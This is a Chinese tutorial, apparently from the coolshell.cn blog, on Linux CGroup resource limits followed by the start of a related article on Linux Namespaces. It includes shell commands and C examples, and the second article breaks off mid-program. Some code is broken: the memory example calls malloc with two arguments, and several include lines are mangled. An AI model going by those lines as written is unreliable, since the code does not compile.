那么CGroup是怎么干的呢？我们先来点感性认识吧。

首先，Linux把CGroup这个事实现成了一个file system，你可以mount。在我的Ubuntu 14.04下，你输入以下命令你就可以看到cgroup已为你mount好了。

hchen@ubuntu:~$ mount -t cgroup

cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,relatime,cpuset)

cgroup on /sys/fs/cgroup/cpu type cgroup (rw,relatime,cpu)

cgroup on /sys/fs/cgroup/cpuacct type cgroup (rw,relatime,cpuacct)

cgroup on /sys/fs/cgroup/memory type cgroup (rw,relatime,memory)

cgroup on /sys/fs/cgroup/devices type cgroup (rw,relatime,devices)

cgroup on /sys/fs/cgroup/freezer type cgroup (rw,relatime,freezer)

cgroup on /sys/fs/cgroup/blkio type cgroup (rw,relatime,blkio)

cgroup on /sys/fs/cgroup/net_prio type cgroup (rw,net_prio)

cgroup on /sys/fs/cgroup/net_cls type cgroup (rw,net_cls)

cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,relatime,perf_event)

cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,relatime,hugetlb)

或者使用lssubsys命令：

$ lssubsys  -m

cpuset /sys/fs/cgroup/cpuset

cpu /sys/fs/cgroup/cpu

cpuacct /sys/fs/cgroup/cpuacct

memory /sys/fs/cgroup/memory

devices /sys/fs/cgroup/devices

freezer /sys/fs/cgroup/freezer

blkio /sys/fs/cgroup/blkio

net_cls /sys/fs/cgroup/net_cls

net_prio /sys/fs/cgroup/net_prio

perf_event /sys/fs/cgroup/perf_event

hugetlb /sys/fs/cgroup/hugetlb

我们可以看到，在/sys/fs下有一个cgroup的目录，这个目录下还有很多子目录，比如： cpu，cpuset，memory，blkio……这些，这些都是cgroup的子系统。分别用于干不同的事的。

如果你没有看到上述的目录，你可以自己mount，下面给了一个示例：

mkdir cgroup

mount -t tmpfs cgroup_root ./cgroup

mkdir cgroup/cpuset

mount -t cgroup -ocpuset cpuset ./cgroup/cpuset/

mkdir cgroup/cpu

mount -t cgroup -ocpu cpu ./cgroup/cpu/

mkdir cgroup/memory

mount -t cgroup -omemory memory ./cgroup/memory/

一旦mount成功，你就会看到这些目录下就有好文件了，比如，如下所示的cpu和cpuset的子系统：

hchen@ubuntu:~$ ls /sys/fs/cgroup/cpu /sys/fs/cgroup/cpuset/ 

/sys/fs/cgroup/cpu:

cgroup.clone_children  cgroup.sane_behavior  cpu.shares         release_agent

cgroup.event_control   cpu.cfs_period_us     cpu.stat           tasks

cgroup.procs           cpu.cfs_quota_us      notify_on_release  user

/sys/fs/cgroup/cpuset/:

cgroup.clone_children  cpuset.mem_hardwall             cpuset.sched_load_balance

cgroup.event_control   cpuset.memory_migrate           cpuset.sched_relax_domain_level

cgroup.procs           cpuset.memory_pressure          notify_on_release

cgroup.sane_behavior   cpuset.memory_pressure_enabled  release_agent

cpuset.cpu_exclusive   cpuset.memory_spread_page       tasks

cpuset.cpus            cpuset.memory_spread_slab       user

cpuset.mem_exclusive   cpuset.mems

你可以到/sys/fs/cgroup的各个子目录下去make个dir，你会发现，一旦你创建了一个子目录，这个子目录里又有很多文件了。

hchen@ubuntu:/sys/fs/cgroup/cpu$ sudo mkdir haoel

[sudo] password **for** hchen: 

hchen@ubuntu:/sys/fs/cgroup/cpu$ ls ./haoel

cgroup.clone_children  cgroup.procs       cpu.cfs_quota_us  cpu.stat           tasks

cgroup.event_control   cpu.cfs_period_us  cpu.shares        notify_on_release

好了，我们来看几个示例。

目录



[CPU 限制](https://coolshell.cn/articles/17049.html#CPU_限制)[内存使用限制](https://coolshell.cn/articles/17049.html#内存使用限制)[磁盘I/O限制](https://coolshell.cn/articles/17049.html#磁盘IO限制)[CGroup的子系统](https://coolshell.cn/articles/17049.html#CGroup的子系统)[CGroup的术语](https://coolshell.cn/articles/17049.html#CGroup的术语)[下一代的CGroup](https://coolshell.cn/articles/17049.html#下一代的CGroup)[参考](https://coolshell.cn/articles/17049.html#参考)

#### CPU 限制

假设，我们有一个非常吃CPU的程序，叫deadloop，其源码如下：

**int** main(**void**)

{

​    **int** i = 0;

​    **for**(;;) i++;

​    **return** 0;

}

用sudo执行起来后，毫无疑问，CPU被干到了100%（下面是top命令的输出）

  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND     

 3529 root      20   0    4196    736    656 R 99.6  0.1   0:23.13 deadloop   

然后，我们这前不是在/sys/fs/cgroup/cpu下创建了一个haoel的group。我们先设置一下这个group的cpu利用的限制：

hchen@ubuntu:~# cat /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us 

-1

root@ubuntu:~# echo 20000 > /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us

我们看到，这个进程的PID是3529，我们把这个进程加到这个cgroup中：



\# echo 3529 >> /sys/fs/cgroup/cpu/haoel/tasks



然后，就会在top中看到CPU的利用立马下降成20%了。（前面我们设置的20000就是20%的意思）

  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND     

 3529 root      20   0    4196    736    656 R 19.9  0.1   8:06.11 deadloop    

下面的代码是一个线程的示例：

**#define _GNU_SOURCE         /\* See feature_test_macros(7) \*/**

**#include <pthread.h>**

**#include <stdio.h>**

**#include <stdlib.h>**

**#include <sys/stat.h>**

**#include <sys/types.h>**

**#include <unistd.h>**

**#include <sys/syscall.h>**

const **int** NUM_THREADS = 5;

**void** *thread_main(**void** *threadid)

{

​    /* 把自己加入cgroup中（syscall(SYS_gettid)为得到线程的系统tid） */

​    **char** cmd[128];

​    sprintf(cmd, "echo %ld >> /sys/fs/cgroup/cpu/haoel/tasks", syscall(SYS_gettid));

​    system(cmd); 

​    sprintf(cmd, "echo %ld >> /sys/fs/cgroup/cpuset/haoel/tasks", syscall(SYS_gettid));

​    system(cmd);

​    **long** tid;

​    tid = (**long**)threadid;

​    printf("Hello World! It's me, thread #%ld, pid #%ld!\n", tid, syscall(SYS_gettid));

​    

​    **int** a=0; 

​    **while**(1) {

​        a++;

​    }

​    pthread_exit(**NULL**);

}

**int** main (**int** argc, **char** *argv[])

{

​    **int** num_threads;

​    **if** (argc > 1){

​        num_threads = atoi(argv[1]);

​    }

​    **if** (num_threads<=0 || num_threads>=100){

​        num_threads = NUM_THREADS;

​    }

​    /* 设置CPU利用率为50% */

​    mkdir("/sys/fs/cgroup/cpu/haoel", 755);

​    system("echo 50000 > /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us");

​    mkdir("/sys/fs/cgroup/cpuset/haoel", 755);

​    /* 限制CPU只能使用#2核和#3核 */

​    system("echo \"2,3\" > /sys/fs/cgroup/cpuset/haoel/cpuset.cpus");

​    pthread_t* threads = (pthread_t*) malloc (sizeof(pthread_t)*num_threads);

​    **int** rc;

​    **long** t;

​    **for**(t=0; t<num_threads; t++){

​        printf("In main: creating thread %ld\n", t);

​        rc = pthread_create(&threads[t], **NULL**, thread_main, (**void** *)t);

​        **if** (rc){

​            printf("ERROR; return code from pthread_create() is %d\n", rc);

​            exit(-1);

​        }

​    }

​    /* Last thing that main() should do */

​    pthread_exit(**NULL**);

​    free(threads);

}

#### 内存使用限制

我们再来看一个限制内存的例子（下面的代码是个死循环，其它不断的分配内存，每次512个字节，每次休息一秒）：

**#include <stdio.h>**

**#include <stdlib.h>**

**#include <string.h>**

**#include <sys/types.h>**

**#include <unistd.h>**

**int** main(**void**)

{

​    **int** size = 0;

​    **int** chunk_size = 512;

​    **void** *p = **NULL**;

​    **while**(1) {

​        **if** ((p = malloc(p, chunk_size)) == **NULL**) {

​            printf("out of memory!!\n");

​            **break**;

​        }

​        memset(p, 1, chunk_size);

​        size += chunk_size;

​        printf("[%d] - memory is allocated [%8d] bytes \n", getpid(), size);

​        sleep(1);

​    }

​    **return** 0;

}

然后，在我们另外一边：

\# 创建memory cgroup

$ mkdir /sys/fs/cgroup/memory/haoel

$ echo 64k > /sys/fs/cgroup/memory/haoel/memory.limit_in_bytes

\# 把上面的进程的pid加入这个cgroup

$ echo [pid] > /sys/fs/cgroup/memory/haoel/tasks 

你会看到，一会上面的进程就会因为内存问题被kill掉了。

#### 磁盘I/O限制

我们先看一下我们的硬盘IO，我们的模拟命令如下：（从/dev/sda1上读入数据，输出到/dev/null上）



sudo dd **if**=/dev/sda1 of=/dev/null



我们通过iotop命令我们可以看到相关的IO速度是55MB/s（虚拟机内）：

  TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO>    COMMAND          

 8128 be/4 root       55.74 M/s    0.00 B/s  0.00 % 85.65 % dd **if**=/de~=/dev/null...

然后，我们先创建一个blkio（块设备IO）的cgroup



mkdir /sys/fs/cgroup/blkio/haoel



并把读IO限制到1MB/s，并把前面那个dd命令的pid放进去（注：8:0 是设备号，你可以通过ls -l /dev/sda1获得）：

root@ubuntu:~# echo '8:0 1048576'  > /sys/fs/cgroup/blkio/haoel/blkio.throttle.read_bps_device 

root@ubuntu:~# echo 8128 > /sys/fs/cgroup/blkio/haoel/tasks

再用iotop命令，你马上就能看到读速度被限制到了1MB/s左右。

  TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO>    COMMAND          

 8128 be/4 root      973.20 K/s    0.00 B/s  0.00 % 94.41 % dd **if**=/de~=/dev/null...

#### CGroup的子系统

好了，有了以上的感性认识我们来，我们来看看control group有哪些子系统：

- blkio — 这个子系统为块设备设定输入/输出限制，比如物理设备（磁盘，固态硬盘，USB 等等）。
- cpu — 这个子系统使用调度程序提供对 CPU 的 cgroup 任务访问。
- cpuacct — 这个子系统自动生成 cgroup 中任务所使用的 CPU 报告。
- cpuset — 这个子系统为 cgroup 中的任务分配独立 CPU（在多核系统）和内存节点。
- devices — 这个子系统可允许或者拒绝 cgroup 中的任务访问设备。
- freezer — 这个子系统挂起或者恢复 cgroup 中的任务。
- memory — 这个子系统设定 cgroup 中任务使用的内存限制，并自动生成内存资源使用报告。
- net_cls — 这个子系统使用等级识别符（classid）标记网络数据包，可允许 Linux 流量控制程序（tc）识别从具体 cgroup 中生成的数据包。
- net_prio — 这个子系统用来设计网络流量的优先级
- hugetlb — 这个子系统主要针对于HugeTLB系统进行限制，这是一个大页文件系统。
- 

注意，你可能在Ubuntu 14.04下看不到net_cls和net_prio这两个cgroup，你需要手动mount一下：

$ sudo modprobe cls_cgroup

$ sudo mkdir /sys/fs/cgroup/net_cls

$ sudo mount -t cgroup -o net_cls none /sys/fs/cgroup/net_cls

$ sudo modprobe netprio_cgroup

$ sudo mkdir /sys/fs/cgroup/net_prio

$ sudo mount -t cgroup -o net_prio none /sys/fs/cgroup/net_prio

关于各个子系统的参数细节，以及更多的Linux CGroup的文档，你可以看看下面的文档：

- [Linux Kernel的官方文档](https://www.kernel.org/doc/Documentation/cgroups/)
- [Redhat的官方文档](https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html-single/Resource_Management_Guide/index.html#ch-Subsystems_and_Tunable_Parameters)

#### CGroup的术语

CGroup有下述术语：

- **任务（Tasks）**：就是系统的一个进程。
- **控制组（Control Group）**：一组按照某种标准划分的进程，比如官方文档中的Professor和Student，或是WWW和System之类的，其表示了某进程组。Cgroups中的资源控制都是以控制组为单位实现。一个进程可以加入到某个控制组。而资源的限制是定义在这个组上，就像上面示例中我用的haoel一样。简单点说，cgroup的呈现就是一个目录带一系列的可配置文件。
- **层级（Hierarchy）**：控制组可以组织成hierarchical的形式，既一颗控制组的树（目录结构）。控制组树上的子节点继承父结点的属性。简单点说，hierarchy就是在一个或多个子系统上的cgroups目录树。
- **子系统（Subsystem）**：一个子系统就是一个资源控制器，比如CPU子系统就是控制CPU时间分配的一个控制器。子系统必须附加到一个层级上才能起作用，一个子系统附加到某个层级以后，这个层级上的所有控制族群都受到这个子系统的控制。Cgroup的子系统可以有很多，也在不断增加中。

#### 下一代的CGroup

上面，我们可以看到，CGroup的一些常用方法和相关的术语。一般来说，这样的设计在一般情况下还是没什么问题的，除了操作上的用户体验不是很好，但基本满足我们的一般需求了。

不过，对此，有个叫Tejun Heo的同学非常不爽，他在Linux社区里[对cgroup吐了一把槽](https://lwn.net/Articles/484254/)，还引发了内核组的各种讨论。

对于Tejun Heo同学来说，cgroup设计的相当糟糕。他给出了些例子，大意就是说，如果有多种层级关系，也就是说有多种对进程的分类方式，比如，我们可以按用户来分，分成Professor和Student，同时，也有按应用类似来分的，比如WWW和NFS等。那么，当一个进程即是Professor的，也是WWW的，那么就会出现多层级正交的情况，从而出现对进程上管理的混乱。另外，一个case是，如果有一个层级A绑定cpu，而层级B绑定memory，还有一个层级C绑定cputset，而有一些进程有的需要AB，有的需要AC，有的需要ABC，管理起来就相当不易。

层级操作起来比较麻烦，而且如果层级变多，更不易于操作和管理，虽然那种方式很好实现，但是在使用上有很多的复杂度。你可以想像一个图书馆的图书分类问题，你可以有各种不同的分类，分类和图书就是一种多对多的关系。

所以，在Kernel 3.16后，引入了[unified hierarchy](http://lwn.net/Articles/601840/)的新的设计，这个东西引入了一个叫**__DEVEL__sane_behavior**的特性（这个名字很明显意味目前还在开发试验阶段），它可以把所有子系统都挂载到根层级下，只有叶子节点可以存在tasks，非叶子节点只进行资源控制。

我们mount一下看看：

$ sudo mount -t cgroup -o __DEVEL__sane_behavior cgroup ./cgroup

$ ls ./cgroup

cgroup.controllers  cgroup.procs  cgroup.sane_behavior  cgroup.subtree_control 

$ cat ./cgroup/cgroup.controllers

cpuset cpu cpuacct memory devices freezer net_cls blkio perf_event net_prio hugetlb

我们可以看到有四个文件，然后，你在这里mkdir一个子目录，里面也会有这四个文件。**上级的cgroup.subtree_control控制下级的cgroup.controllers。**

举个例子：假设我们有以下的目录结构，b代表blkio，m代码memory，其中，A是root，包括所有的子系统（）。

\# A(b,m) - B(b,m) - C (b)

\#               \ - D (b) - E

\# 下面的命令中， +表示enable， -表示disable

\# 在B上的enable blkio

\# echo +blkio > A/cgroup.subtree_control

\# 在C和D上enable blkio 

\# echo +blkio > A/B/cgroup.subtree_control

\# 在B上enable memory  

\# echo +memory > A/cgroup.subtree_control

在上述的结构中，

- cgroup只有上线控制下级，无法传递到下下级。所以，C和D中没有memory的限制，E中没有blkio和memory的限制。而本层的cgroup.controllers文件是个只读的，其中的内容就看上级的subtree_control里有什么了。
- **任何被配置过subtree_control的目录都不能绑定进程，根结点除外**。所以，A,C,D,E可以绑上进程，但是B不行。

我们可以看到，**这种方式干净的区分开了两个事，一个是进程的分组，一个是对分组的资源控制**（以前这两个事完全混在一起），在目录继承上增加了些限制，这样可以避免一些模棱两可的情况。

当然，这个事还在演化中，cgroup的这些问题这个事目前由cgroup的吐槽人Tejun Heo和华为的Li Zefan同学负责解决中。总之，这是一个系统管理上的问题，而且改变会影响很多东西，但一旦方案确定，老的cgroup方式将一去不复返。

#### 参考

- [Linux Kernel Cgroup Documents](https://www.kernel.org/doc/Documentation/cgroups/)
- [Reahat Resource Management Guide](https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html-single/Resource_Management_Guide/index.html)
- [Fixing control groups](https://lwn.net/Articles/484251/)
- [The unified control group hierarchy in 3.16](http://lwn.net/Articles/601840/)
- [Cgroup v2(PDF)](http://events.linuxfoundation.org/sites/events/files/slides/2014-KLF.pdf)

（全文完）

# DOCKER基础技术：LINUX NAMESPACE（上）

#####  [2015年04月16日 ](https://coolshell.cn/articles/17010.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [113 条评论](https://coolshell.cn/articles/17010.html#comments) 241,704 人阅读

![isolation](photo/isolation.jpg)时下最热的技术莫过于Docker了，很多人都觉得Docker是个新技术，其实不然，Docker除了其编程语言用go比较新外，其实它还真不是个新东西，也就是个新瓶装旧酒的东西，所谓的The New “Old Stuff”。Docker和Docker衍生的东西用到了很多很酷的技术，我会用几篇 文章来把这些技术给大家做个介绍，希望通过这些文章大家可以自己打造一个山寨版的docker。

当然，文章的风格一定会尊重时下的“流行”——**我们再也没有整块整块的时间去看书去专研，而我们只有看微博微信那样的碎片时间**（那怕我们有整块的时间，也被那些在手机上的APP碎片化了）。所以，这些文章的风格必然坚持“马桶风格”（希望简单到占用你拉一泡屎就时间，而且你还不用动脑子，并能学到些东西）

废话少说，我们开始。先从Linux Namespace开始。

目录



[ 简介](https://coolshell.cn/articles/17010.html#_简介)[clone()系统调用](https://coolshell.cn/articles/17010.html#clone系统调用)[UTS Namespace](https://coolshell.cn/articles/17010.html#UTS_Namespace)[IPC Namespace](https://coolshell.cn/articles/17010.html#IPC_Namespace)[PID Namespace](https://coolshell.cn/articles/17010.html#PID_Namespace)[Mount Namespace](https://coolshell.cn/articles/17010.html#Mount_Namespace)[Docker的 Mount Namespace](https://coolshell.cn/articles/17010.html#Docker的_Mount_Namespace)

####  简介

Linux Namespace是Linux提供的一种内核级别环境隔离的方法。不知道你是否还记得很早以前的Unix有一个叫chroot的系统调用（通过修改根目录把用户jail到一个特定目录下），chroot提供了一种简单的隔离模式：chroot内部的文件系统无法访问外部的内容。Linux Namespace在此基础上，提供了对UTS、IPC、mount、PID、network、User等的隔离机制。



举个例子，我们都知道，Linux下的超级父亲进程的PID是1，所以，同chroot一样，如果我们可以把用户的进程空间jail到某个进程分支下，并像chroot那样让其下面的进程 看到的那个超级父进程的PID为1，于是就可以达到资源隔离的效果了（不同的PID namespace中的进程无法看到彼此）

**Linux Namespace 有如下种类**，官方文档在这里《[Namespace in Operation](http://lwn.net/Articles/531114/)》

| 分类                   | 系统调用参数  | 相关内核版本                                                 |
| :--------------------- | :------------ | :----------------------------------------------------------- |
| **Mount namespaces**   | CLONE_NEWNS   | [Linux 2.4.19](http://lwn.net/2001/0301/a/namespaces.php3)   |
| **UTS namespaces**     | CLONE_NEWUTS  | [Linux 2.6.19](http://lwn.net/Articles/179345/)              |
| **IPC namespaces**     | CLONE_NEWIPC  | [Linux 2.6.19](http://lwn.net/Articles/187274/)              |
| **PID namespaces**     | CLONE_NEWPID  | [Linux 2.6.24](http://lwn.net/Articles/259217/)              |
| **Network namespaces** | CLONE_NEWNET  | [始于Linux 2.6.24 完成于 Linux 2.6.29](http://lwn.net/Articles/219794/) |
| **User namespaces**    | CLONE_NEWUSER | [始于 Linux 2.6.23 完成于 Linux 3.8)](http://lwn.net/Articles/528078/) |

主要是三个系统调用

- **`clone`****()** – 实现线程的系统调用，用来创建一个新的进程，并可以通过设计上述参数达到隔离。
- **`unshare`****()** – 使某进程脱离某个namespace
- **`setns`****()** – 把某进程加入到某个namespace

unshare() 和 setns() 都比较简单，大家可以自己man，我这里不说了。

下面还是让我们来看一些示例（以下的测试程序最好在Linux 内核为3.8以上的版本中运行，我用的是ubuntu 14.04）。

#### clone()系统调用

首先，我们来看一下一个最简单的clone()系统调用的示例，（后面，我们的程序都会基于这个程序做修改）：

**#define _GNU_SOURCE**

**#include <sys/types.h>**

**#include <sys/wait.h>**

**#include <stdio.h>**

**#include <sched.h>**

**#include <signal.h>**

**#include <unistd.h>**

/* 定义一个给 clone 用的栈，栈大小1M */

**#define STACK_SIZE (1024 \* 1024)**

**static** **char** container_stack[STACK_SIZE];

**char*** const container_args[] = {

​    "/bin/bash",

​    **NULL**

};

**int** container_main(**void*** arg)

{

​    printf("Container - inside the container!\n");

​    /* 直接执行一个shell，以便我们观察这个进程空间里的资源是否被隔离了 */

​    execv(container_args[0], container_args); 

​    printf("Something's wrong!\n");

​    **return** 1;

}

**int** main()

{

​    printf("Parent - start a container!\n");

​    /* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */

​    **int** container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD, **NULL**);

​    /* 等待子进程结束 */

​    waitpid(container_pid, **NULL**, 0);

​    printf("Parent - container stopped!\n");

​    **return** 0;

}

从上面的程序，我们可以看到，这和pthread基本上是一样的玩法。但是，对于上面的程序，父子进程的进程空间是没有什么差别的，父进程能访问到的子进程也能。

下面， 让我们来看几个例子看看，Linux的Namespace是什么样的。

#### UTS Namespace

下面的代码，我略去了上面那些头文件和数据结构的定义，只有最重要的部分。

**int** container_main(**void*** arg)

{

​    printf("Container - inside the container!\n");

​    sethostname("container",10); /* 设置hostname */

​    execv(container_args[0], container_args);

​    printf("Something's wrong!\n");

​    **return** 1;

}

**int** main()

{

​    printf("Parent - start a container!\n");

​    **int** container_pid = clone(container_main, container_stack+STACK_SIZE, 

​            CLONE_NEWUTS | SIGCHLD, **NULL**); /*启用CLONE_NEWUTS Namespace隔离 */

​    waitpid(container_pid, **NULL**, 0);

​    printf("Parent - container stopped!\n");

​    **return** 0;

}

```
运行上面的程序你会发现（需要root权限），子进程的hostname变成了 container。
```

hchen@ubuntu:~$ sudo ./uts

Parent - start a container!

Container - inside the container!

root@container:~# hostname

container

root@container:~# uname -n

container

#### IPC Namespace

IPC全称 Inter-Process Communication，是Unix/Linux下进程间通信的一种方式，IPC有共享内存、信号量、消息队列等方法。所以，为了隔离，我们也需要把IPC给隔离开来，这样，只有在同一个Namespace下的进程才能相互通信。如果你熟悉IPC的原理的话，你会知道，IPC需要有一个全局的ID，即然是全局的，那么就意味着我们的Namespace需要对这个ID隔离，不能让别的Namespace的进程看到。

要启动IPC隔离，我们只需要在调用clone时加上CLONE_NEWIPC参数就可以了。

**int** container_pid = clone(container_main, container_stack+STACK_SIZE, 

​            CLONE_NEWUTS | CLONE_NEWIPC | SIGCHLD, **NULL**);

首先，我们先创建一个IPC的Queue（如下所示，全局的Queue ID是0）

hchen@ubuntu:~$ ipcmk -Q 

Message queue id: 0

hchen@ubuntu:~$ ipcs -q

------ Message Queues --------

key        msqid      owner      perms      used-bytes   messages    

0xd0d56eb2 0          hchen      644        0            0

如果我们运行没有CLONE_NEWIPC的程序，我们会看到，在子进程中还是能看到这个全启的IPC Queue。

hchen@ubuntu:~$ sudo ./uts 

Parent - start a container!

Container - inside the container!

root@container:~# ipcs -q

------ Message Queues --------

key        msqid      owner      perms      used-bytes   messages    

0xd0d56eb2 0          hchen      644        0            0

但是，如果我们运行加上了CLONE_NEWIPC的程序，我们就会下面的结果：

root@ubuntu:~$ sudo./ipc

Parent - start a container!

Container - inside the container!

root@container:~/linux_namespace# ipcs -q

------ Message Queues --------

key        msqid      owner      perms      used-bytes   messages

我们可以看到IPC已经被隔离了。

#### PID Namespace

我们继续修改上面的程序：

**int** container_main(**void*** arg)

{

​    /* 查看子进程的PID，我们可以看到其输出子进程的 pid 为 1 */

​    printf("Container [%5d] - inside the container!\n", getpid());

​    sethostname("container",10);

​    execv(container_args[0], container_args);

​    printf("Something's wrong!\n");

​    **return** 1;

}

**int** main()

{

​    printf("Parent [%5d] - start a container!\n", getpid());

​    /*启用PID namespace - CLONE_NEWPID*/

​    **int** container_pid = clone(container_main, container_stack+STACK_SIZE, 

​            CLONE_NEWUTS | CLONE_NEWPID | SIGCHLD, **NULL**); 

​    waitpid(container_pid, **NULL**, 0);

​    printf("Parent - container stopped!\n");

​    **return** 0;

}

运行结果如下（我们可以看到，子进程的pid是1了）：

hchen@ubuntu:~$ sudo ./pid

Parent [ 3474] - start a container!

Container [ 1] - inside the container!

root@container:~# echo $$

1

你可能会问，PID为1有个毛用啊？我们知道，在传统的UNIX系统中，PID为1的进程是init，地位非常特殊。他作为所有进程的父进程，有很多特权（比如：屏蔽信号等），另外，其还会为检查所有进程的状态，我们知道，如果某个子进程脱离了父进程（父进程没有wait它），那么init就会负责回收资源并结束这个子进程。所以，要做到进程空间的隔离，首先要创建出PID为1的进程，最好就像chroot那样，把子进程的PID在容器内变成1。

**但是，我们会发现，在子进程的shell里输入ps,top等命令，我们还是可以看得到所有进程**。说明并没有完全隔离。这是因为，像ps, top这些命令会去读/proc文件系统，所以，因为/proc文件系统在父进程和子进程都是一样的，所以这些命令显示的东西都是一样的。

所以，我们还需要对文件系统进行隔离。

#### Mount Namespace

下面的例程中，我们在启用了mount namespace并在子进程中重新mount了/proc文件系统。

**int** container_main(**void*** arg)

{

​    printf("Container [%5d] - inside the container!\n", getpid());

​    sethostname("container",10);

​    /* 重新mount proc文件系统到 /proc下 */

​    system("mount -t proc proc /proc");

​    execv(container_args[0], container_args);

​    printf("Something's wrong!\n");

​    **return** 1;

}

**int** main()

{

​    printf("Parent [%5d] - start a container!\n", getpid());

​    /* 启用Mount Namespace - 增加CLONE_NEWNS参数 */

​    **int** container_pid = clone(container_main, container_stack+STACK_SIZE, 

​            CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, **NULL**);

​    waitpid(container_pid, **NULL**, 0);

​    printf("Parent - container stopped!\n");

​    **return** 0;

}

运行结果如下：

hchen@ubuntu:~$ sudo ./pid.mnt

Parent [ 3502] - start a container!

Container [    1] - inside the container!

root@container:~# ps -elf 

F S UID        PID  PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD

4 S root         1     0  0  80   0 -  6917 wait   19:55 pts/2    00:00:00 /bin/bash

0 R root        14     1  0  80   0 -  5671 -      19:56 pts/2    00:00:00 ps -elf

上面，我们可以看到只有两个进程 ，而且pid=1的进程是我们的/bin/bash。我们还可以看到/proc目录下也干净了很多：

root@container:~# ls /proc

1          dma          key-users   net            sysvipc

16         driver       kmsg        pagetypeinfo   timer_list

acpi       execdomains  kpagecount  partitions     timer_stats

asound     fb           kpageflags  sched_debug    tty

buddyinfo  filesystems  loadavg     schedstat      uptime

bus        fs           locks       scsi           version

cgroups    interrupts   mdstat      self           version_signature

cmdline    iomem        meminfo     slabinfo       vmallocinfo

consoles   ioports      misc        softirqs       vmstat

cpuinfo    irq          modules     stat           zoneinfo

crypto     kallsyms     mounts      swaps

devices    kcore        mpt         sys

diskstats  keys         mtrr        sysrq-trigger

下图，我们也可以看到在子进程中的top命令只看得到两个进程了。

![img](photo/mount.namespace.jpg)

这里，多说一下。在通过CLONE_NEWNS创建mount namespace后，父进程会把自己的文件结构复制给子进程中。而子进程中新的namespace中的所有mount操作都只影响自身的文件系统，而不对外界产生任何影响。这样可以做到比较严格地隔离。



你可能会问，我们是不是还有别的一些文件系统也需要这样mount? 是的。

#### Docker的 Mount Namespace

下面我将向演示一个“山寨镜像”，其模仿了Docker的Mount Namespace。

首先，我们需要一个rootfs，也就是我们需要把我们要做的镜像中的那些命令什么的copy到一个rootfs的目录下，我们模仿Linux构建如下的目录：

hchen@ubuntu:~/rootfs$ ls

bin  dev  etc  home  lib  lib64  mnt  opt  proc  root  run  sbin  sys  tmp  usr  var

然后，我们把一些我们需要的命令copy到 rootfs/bin目录中（sh命令必需要copy进去，不然我们无法 chroot ）

hchen@ubuntu:~/rootfs$ ls ./bin ./usr/bin

 

./bin:

bash   chown  gzip      less  mount       netstat  rm     tabs  tee      top       tty

cat    cp     hostname  ln    mountpoint  ping     sed    tac   test     touch     umount

chgrp  echo   ip        ls    mv          ps       sh     tail  timeout  tr        uname

chmod  grep   kill      more  nc          pwd      sleep  tar   toe      truncate  which

./usr/bin:

awk  env  groups  head  id  mesg  sort  strace  tail  top  uniq  vi  wc  xargs

注：你可以使用ldd命令把这些命令相关的那些so文件copy到对应的目录：

hchen@ubuntu:~/rootfs/bin$ ldd bash

  linux-vdso.so.1 =>  (0x00007fffd33fc000)

  libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f4bd42c2000)

  libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4bd40be000)

  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4bd3cf8000)

  /lib64/ld-linux-x86-64.so.2 (0x00007f4bd4504000)

下面是我的rootfs中的一些so文件：

hchen@ubuntu:~/rootfs$ ls ./lib64 ./lib/x86_64-linux-gnu/

./lib64:

ld-linux-x86-64.so.2

./lib/x86_64-linux-gnu/:

libacl.so.1      libmemusage.so         libnss_files-2.19.so    libpython3.4m.so.1

libacl.so.1.1.0  libmount.so.1          libnss_files.so.2       libpython3.4m.so.1.0

libattr.so.1     libmount.so.1.1.0      libnss_hesiod-2.19.so   libresolv-2.19.so

libblkid.so.1    libm.so.6              libnss_hesiod.so.2      libresolv.so.2

libc-2.19.so     libncurses.so.5        libnss_nis-2.19.so      libselinux.so.1

libcap.a         libncurses.so.5.9      libnss_nisplus-2.19.so  libtinfo.so.5

libcap.so        libncursesw.so.5       libnss_nisplus.so.2     libtinfo.so.5.9

libcap.so.2      libncursesw.so.5.9     libnss_nis.so.2         libutil-2.19.so

libcap.so.2.24   libnsl-2.19.so         libpcre.so.3            libutil.so.1

libc.so.6        libnsl.so.1            libprocps.so.3          libuuid.so.1

libdl-2.19.so    libnss_compat-2.19.so  libpthread-2.19.so      libz.so.1

libdl.so.2       libnss_compat.so.2     libpthread.so.0

libgpm.so.2      libnss_dns-2.19.so     libpython2.7.so.1

libm-2.19.so     libnss_dns.so.2        libpython2.7.so.1.0

包括这些命令依赖的一些配置文件：

hchen@ubuntu:~/rootfs$ ls ./etc

bash.bashrc  group  hostname  hosts  ld.so.cache  nsswitch.conf  passwd  profile  

resolv.conf  shadow

你现在会说，我靠，有些配置我希望是在容器起动时给他设置的，而不是hard code在镜像中的。比如：/etc/hosts，/etc/hostname，还有DNS的/etc/resolv.conf文件。好的。那我们在rootfs外面，我们再创建一个conf目录，把这些文件放到这个目录中。

hchen@ubuntu:~$ ls ./conf

hostname     hosts     resolv.conf

这样，我们的父进程就可以动态地设置容器需要的这些文件的配置， 然后再把他们mount进容器，这样，容器的镜像中的配置就比较灵活了。

好了，终于到了我们的程序。

**#define _GNU_SOURCE**

**#include <sys types.h="">**

**#include <sys wait.h="">**

**#include <sys mount.h="">**

**#include <stdio.h>**

**#include <sched.h>**

**#include <signal.h>**

**#include <unistd.h>**

**#define STACK_SIZE (1024 \* 1024)**

**static** **char** container_stack[STACK_SIZE];

**char*** const container_args[] = {

